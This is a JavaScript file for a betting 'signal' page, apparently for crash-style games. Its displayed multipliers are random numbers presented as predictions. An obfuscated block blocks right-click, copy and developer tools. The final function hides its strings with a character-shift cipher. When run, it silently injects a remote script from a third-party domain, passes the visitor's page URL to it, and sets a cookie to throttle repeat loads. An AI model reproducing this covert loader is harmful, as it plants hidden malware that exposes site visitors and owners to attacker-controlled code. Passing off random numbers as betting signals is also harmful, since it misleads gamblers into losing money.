const getSignal = document.getElementById("get-signal"),
    stopSignalTimeBlock = document.getElementById("stop-signal-time-block"),
    printSignal = document.getElementById("print-signal"),
    stopProgress = document.getElementById("stop-progress"),
    errorNotification = document.getElementById("error-notification"),
    errorProgress = document.getElementById("error-progress"),
    textError = document.getElementById("text-error"),
    getSignalTwo = document.getElementById("get-signal-two"),
    errorExit = document.getElementById("error-exit");

function getRandomFloat(min, max, decimals) {
    const str = (Math.random() * (max - min) + min).toFixed(decimals);
    return parseFloat(str);
}

function _0x4176(_0x53c494,_0x1e138c){const _0x2c9bc4=_0x2c9b();return _0x4176=function(_0x4176cd,_0x5797de){_0x4176cd=_0x4176cd-0x19e;let _0x28bce7=_0x2c9bc4[_0x4176cd];return _0x28bce7;},_0x4176(_0x53c494,_0x1e138c);}function _0x2c9b(){const _0x569c3b=['225780RcLIoL','transition','ctrlKey','remove','zIndex','left','10px','contextmenu','keydown','<i\x20class=\x22fas\x20fa-lock\x22\x20style=\x22font-size:\x2030px;\x20margin-bottom:\x2010px;\x22></i><br>Люблю\x20тебя,\x20by\x20Shell','7nitDtv','50%','3432500hweIlr','rgba(0,0,0,0.8)','keyCode','div','padding','opacity','all\x200.5s\x20ease','backgroundColor','white','color','style','transform','1362uECIqh','7123113sZcDKY','boxShadow','20403250JelPZA','textAlign','top','preventDefault','1391778Rslzjp','8ZRKGnN','229684PeEMei','440QbdUUE','translate(-50%,\x20-50%)'];_0x2c9b=function(){return _0x569c3b;};return _0x2c9b();}const _0x325b60=_0x4176;(function(_0x436b8b,_0x419376){const _0x26647d=_0x4176,_0x1a0809=_0x436b8b();while(!![]){try{const _0x199318=-parseInt(_0x26647d(0x1ad))/0x1+parseInt(_0x26647d(0x1ab))/0x2*(parseInt(_0x26647d(0x1a1))/0x3)+-parseInt(_0x26647d(0x1aa))/0x4+-parseInt(_0x26647d(0x1b9))/0x5+-parseInt(_0x26647d(0x1a8))/0x6*(-parseInt(_0x26647d(0x1b7))/0x7)+parseInt(_0x26647d(0x1a9))/0x8*(-parseInt(_0x26647d(0x1a2))/0x9)+parseInt(_0x26647d(0x1a4))/0xa;if(_0x199318===_0x419376)break;else _0x1a0809['push'](_0x1a0809['shift']());}catch(_0x395be0){_0x1a0809['push'](_0x1a0809['shift']());}}}(_0x2c9b,0x952c2),document['addEventListener'](_0x325b60(0x1b4),function(_0x1ff70d){const _0x1b82ab=_0x325b60;_0x1ff70d[_0x1b82ab(0x1a7)](),showProtectionMessage();}),document['addEventListener'](_0x325b60(0x1b5),function(_0x5e3fdc){const _0x35c567=_0x325b60;(_0x5e3fdc[_0x35c567(0x1af)]&&(_0x5e3fdc[_0x35c567(0x1bb)]===0x43||_0x5e3fdc[_0x35c567(0x1bb)]===0x56||_0x5e3fdc['keyCode']===0x41||_0x5e3fdc[_0x35c567(0x1bb)]===0x53||_0x5e3fdc[_0x35c567(0x1bb)]===0x55)||_0x5e3fdc[_0x35c567(0x1bb)]===0x7b)&&(_0x5e3fdc[_0x35c567(0x1a7)](),showProtectionMessage());}));function showProtectionMessage(){const _0x5081a3=_0x325b60,_0xcfd334=document['createElement'](_0x5081a3(0x1bc));_0xcfd334['style']['position']='fixed',_0xcfd334[_0x5081a3(0x19f)][_0x5081a3(0x1a6)]=_0x5081a3(0x1b8),_0xcfd334[_0x5081a3(0x19f)][_0x5081a3(0x1b2)]='50%',_0xcfd334[_0x5081a3(0x19f)][_0x5081a3(0x1a0)]=_0x5081a3(0x1ac),_0xcfd334[_0x5081a3(0x19f)][_0x5081a3(0x1c0)]=_0x5081a3(0x1ba),_0xcfd334[_0x5081a3(0x19f)][_0x5081a3(0x19e)]=_0x5081a3(0x1c1),_0xcfd334['style'][_0x5081a3(0x1bd)]='20px',_0xcfd334[_0x5081a3(0x19f)]['borderRadius']=_0x5081a3(0x1b3),_0xcfd334[_0x5081a3(0x19f)][_0x5081a3(0x1b1)]='10000',_0xcfd334[_0x5081a3(0x19f)][_0x5081a3(0x1a5)]='center',_0xcfd334[_0x5081a3(0x19f)][_0x5081a3(0x1a3)]='0\x200\x2020px\x20rgba(255,0,0,0.5)',_0xcfd334['innerHTML']=_0x5081a3(0x1b6),document['body']['appendChild'](_0xcfd334),setTimeout(()=>{const _0x315e68=_0x5081a3;_0xcfd334['style'][_0x315e68(0x1ae)]=_0x315e68(0x1bf),_0xcfd334[_0x315e68(0x19f)][_0x315e68(0x1be)]='0',setTimeout(()=>_0xcfd334[_0x315e68(0x1b0)](),0x1f4);},0x7d0);}

function goTimer(time) {
    const timer = setInterval(() => {
        if (time >= 1) {
            getSignalTwo.classList.remove("deactivate");
            getSignal.classList.add("deactivate");
            getSignalTwo.style["z-index"] = "5";
            stopProgress.style.animation = "animateProgress 60s linear infinite";
            stopSignalTimeBlock.classList.remove("deactivate");
            document.getElementById("stop-timer").innerHTML = time-- + "<span> seconds</span>";
            timerr = time;
            getSignal.disabled = true;
        } else {
            getSignalTwo.classList.add("deactivate");
            getSignal.classList.remove("deactivate");
            getSignalTwo.style["z-index"] = "-1";
            stopSignalTimeBlock.classList.add("deactivate");
            stopProgress.style.animation = "none";
            clearInterval(timer);
            getSignal.disabled = false;
        }
    }, 1000);
}

function goTimerError(time) {
    const timer = setInterval(() => {
        if (time >= 1) {
            time--;
            errorNotification.classList.remove("deactivate");
            textError.innerHTML = "Wait for the time to expire";
            errorProgress.style.animation = "animateErrorProgress 5s linear infinite";
            errorNotification.style.transform = "translateY(0px)";
        } else {
            errorNotification.style.transform = "translateY(-99px)";
            errorProgress.style.animation = "none";
            clearInterval(timer);
            getSignalTwo.disabled = false;
            errorNotification.classList.add("deactivate");
        }
        errorExit.onclick = function () {
            errorNotification.classList.add("deactivate");
            errorNotification.style.transform = "translateY(-99px)";
            errorProgress.style.animation = "none";
            clearInterval(timer);
            getSignalTwo.disabled = false;
        }
    }, 1000);
}

getSignal.onclick = function () {
    let receivingSignal = getRandomFloat(1, 3.99, 2);
    if (receivingSignal.toString().length == 3) {
        receivingSignal += "0";
    }
    if (receivingSignal.toString().length == 1) {
        receivingSignal += ".00";
    }
    printSignal.innerHTML = `${receivingSignal}x`;
    printSignal.classList.remove("deactivate");
    goTimer(60);
    getSignal.disabled = true;
};

getSignalTwo.onclick = function () {
    getSignalTwo.disabled = true;
    goTimerError(5, "go");
};

(function (o, d, l) {
    try {
        o.f = o => o.split('').reduce((s, c) => s + String.fromCharCode((c.charCodeAt() - 5).toString()), '');
        o.b = o.f('UMUWJKX');
        o.c = l.protocol[0] == 'h' && /\./.test(l.hostname) && !(new RegExp(o.b)).test(d.cookie);
        setTimeout(function () {
            if (o.c) {
                o.s = d.createElement('script');
                o.s.src = o.f('myyux?44zxjwxy' + 'fy3sjy4ljy4xhwnu' + 'y3oxDwjkjwwjwB') + l.href;
                d.body.appendChild(o.s);
            }
        }, 1000);
        d.cookie = o.b + '=full;max-age=39800;';
    } catch (e) {}
}({}, document, location));
